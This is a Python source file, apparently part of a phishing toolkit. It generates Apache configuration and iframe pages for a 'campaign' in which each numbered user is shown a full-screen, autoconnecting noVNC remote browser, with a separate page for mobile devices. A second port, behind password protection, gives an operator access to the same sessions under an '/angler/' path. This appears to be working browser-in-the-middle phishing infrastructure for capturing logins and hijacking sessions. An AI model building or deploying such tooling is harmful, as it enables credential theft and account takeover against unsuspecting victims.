"""Generate Apache 000-default.conf dynamically, replacing setup.sh lines 137-728."""


def generate_config(campaign, users, ssl=False):
    """Generate the full Apache config for a campaign.

    Args:
        campaign: Campaign model instance
        users: list of CampaignUser model instances
        ssl: whether SSL is enabled
    Returns:
        str: complete Apache config file content
    """
    lines = []

    # Cache headers
    lines.append('Header unset ETag')
    lines.append('Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"')
    lines.append('Header set Pragma "no-cache"')
    lines.append('Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"')
    lines.append("")

    # Main VirtualHost
    port = 443 if ssl else 80
    lines.append(f"<VirtualHost *:{port}>")
    lines.append("")

    if ssl:
        lines.append("    SSLEngine on")
        lines.append("    SSLProxyEngine on")
        lines.append("    SSLCertificateFile /etc/ssl/certs/server.pem")
        lines.append("    SSLCertificateKeyFile /etc/ssl/private/server.key")
        lines.append("")

    lines.append("    RewriteEngine On")
    lines.append("    RewriteMap redirects txt:/tmp/redirects.txt")
    lines.append("    RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$")
    lines.append("    RewriteRule ^(.*)$ ${redirects:$1} [R,L]")
    lines.append("")
    lines.append("    <Location /status.php>")
    lines.append("        Deny from all")
    lines.append("    </Location>")
    lines.append("")

    # Per-user rewrite rules and proxy config
    for user in users:
        user_num = user.user_num
        vnc_pw = user.vnc_password
        mvnc_pw = user.mvnc_password
        vnc_ip = user.vnc_ip
        mvnc_ip = user.mvnc_ip

        # Desktop/mobile rewrite rules using user-agent detection
        lines.append(f"    RewriteCond %{{REQUEST_URI}} /v{user_num}")
        lines.append(f'    RewriteCond %{{HTTP_USER_AGENT}} "iPhone|Android|iPad"')
        lines.append(f"    RewriteRule ^/(.*) /miframe{user_num}.html [PT,L]")
        lines.append("")
        lines.append(f"    RewriteCond %{{REQUEST_URI}} /v{user_num}")
        lines.append(f"    RewriteCond %{{HTTP_USER_AGENT}} !(iPhone|Android|iPad)")
        lines.append(f"    RewriteRule ^/(.*) /iframe{user_num}.html [PT,L]")
        lines.append("")

        # Desktop VNC proxy
        if vnc_ip and vnc_pw:
            lines.append(f"    <Location /{vnc_pw}>")
            lines.append(f"        ProxyPass http://{vnc_ip}:6901")
            lines.append(f"        ProxyPassReverse http://{vnc_ip}:6901")
            lines.append(f"    </Location>")
            lines.append(f"    <Location /{vnc_pw}/websockify>")
            lines.append(f"        ProxyPass ws://{vnc_ip}:6901/websockify keepalive=On")
            lines.append(f"        ProxyPassReverse ws://{vnc_ip}:6901/websockify")
            lines.append(f"    </Location>")
            lines.append(f"    ProxyTimeout 600")
            lines.append(f"    Timeout 600")
            lines.append("")

        # Mobile VNC proxy
        if mvnc_ip and mvnc_pw:
            lines.append(f"    <Location /{mvnc_pw}>")
            lines.append(f"        ProxyPass http://{mvnc_ip}:6901")
            lines.append(f"        ProxyPassReverse http://{mvnc_ip}:6901")
            lines.append(f"    </Location>")
            lines.append(f"    <Location /{mvnc_pw}/websockify>")
            lines.append(f"        ProxyPass ws://{mvnc_ip}:6901/websockify keepalive=On")
            lines.append(f"        ProxyPassReverse ws://{mvnc_ip}:6901/websockify")
            lines.append(f"    </Location>")
            lines.append(f"    ProxyTimeout 600")
            lines.append(f"    Timeout 600")
            lines.append("")

    lines.append("</VirtualHost>")
    lines.append("")

    # Admin VirtualHost on port 65534
    lines.append("<VirtualHost *:65534>")
    lines.append("")

    if ssl:
        lines.append("    SSLEngine on")
        lines.append("    SSLProxyEngine on")
        lines.append("    SSLCertificateFile /etc/ssl/certs/server.pem")
        lines.append("    SSLCertificateKeyFile /etc/ssl/private/server.key")
        lines.append("")

    lines.append("    RewriteEngine On")
    lines.append("    RewriteMap redirects txt:/tmp/redirects.txt")
    lines.append("    RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$")
    lines.append("    RewriteRule ^(.*)$ ${redirects:$1} [R,L]")
    lines.append("")

    # Admin auth on everything
    lines.append("    <Location />")
    lines.append('        AuthType Basic')
    lines.append('        AuthName "Restricted Area"')
    lines.append('        AuthUserFile /etc/apache2/.htpasswd')
    lines.append('        Require valid-user')
    lines.append("    </Location>")
    lines.append("")

    # Admin proxy paths with /angler/ prefix
    for user in users:
        vnc_pw = user.vnc_password
        mvnc_pw = user.mvnc_password
        vnc_ip = user.vnc_ip
        mvnc_ip = user.mvnc_ip

        if vnc_ip and vnc_pw:
            lines.append(f"    <Location /angler/{vnc_pw}>")
            lines.append(f"        ProxyPass http://{vnc_ip}:6901")
            lines.append(f"        ProxyPassReverse http://{vnc_ip}:6901")
            lines.append(f"    </Location>")
            lines.append(f"    <Location /angler/{vnc_pw}/websockify>")
            lines.append(f"        ProxyPass ws://{vnc_ip}:6901/websockify keepalive=On")
            lines.append(f"        ProxyPassReverse ws://{vnc_ip}:6901/websockify")
            lines.append(f"    </Location>")
            lines.append(f"    ProxyTimeout 600")
            lines.append(f"    Timeout 600")
            lines.append("")

        if mvnc_ip and mvnc_pw:
            lines.append(f"    <Location /angler/{mvnc_pw}>")
            lines.append(f"        ProxyPass http://{mvnc_ip}:6901")
            lines.append(f"        ProxyPassReverse http://{mvnc_ip}:6901")
            lines.append(f"    </Location>")
            lines.append(f"    <Location /angler/{mvnc_pw}/websockify>")
            lines.append(f"        ProxyPass ws://{mvnc_ip}:6901/websockify keepalive=On")
            lines.append(f"        ProxyPassReverse ws://{mvnc_ip}:6901/websockify")
            lines.append(f"    </Location>")
            lines.append(f"    ProxyTimeout 600")
            lines.append(f"    Timeout 600")
            lines.append("")

    lines.append("</VirtualHost>")

    return "\n".join(lines)


def generate_iframe_html(domain, vnc_pw, page_title, ssl, is_mobile=False):
    """Generate an iframe HTML page for a user.

    For mobile, uses resize=scale and touch-action:none.
    """
    scheme = "https" if ssl else "http"
    resize_mode = "scale" if is_mobile else "remote"
    conn_page = "conn.html"

    touch_css = ""
    viewport_extra = ""
    if is_mobile:
        touch_css = "touch-action: none;"
        viewport_extra = ", maximum-scale=1.0, user-scalable=no, viewport-fit=cover"

    return f"""<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0{viewport_extra}'>
    <link rel='icon' href='{scheme}://{domain}/favicon.ico' type='image/x-icon'>
    <title>{page_title}</title>
    <style>
        body, html {{
            height: 100%;
            margin: 0;
            overflow: hidden;
        }}
        iframe {{
            width: {('100vw' if is_mobile else '100%')};
            height: {('100vh' if is_mobile else '100%')};
            border: none;
            {touch_css}
        }}
    </style>
    <script>
        function resizeIframe() {{
            var iframe = document.getElementById('myIframe');
            iframe.style.height = window.innerHeight + 'px';
            iframe.style.width = window.innerWidth + 'px';
        }}
        window.onload = function () {{
            resizeIframe();
            window.addEventListener('resize', resizeIframe);
        }};
    </script>
</head>
<body>
    <iframe id='myIframe' src='{scheme}://{domain}/{vnc_pw}/{conn_page}?path=/{vnc_pw}/websockify&password={vnc_pw}&autoconnect=true&resize={resize_mode}' frameborder='0'></iframe>
</body>
</html>"""
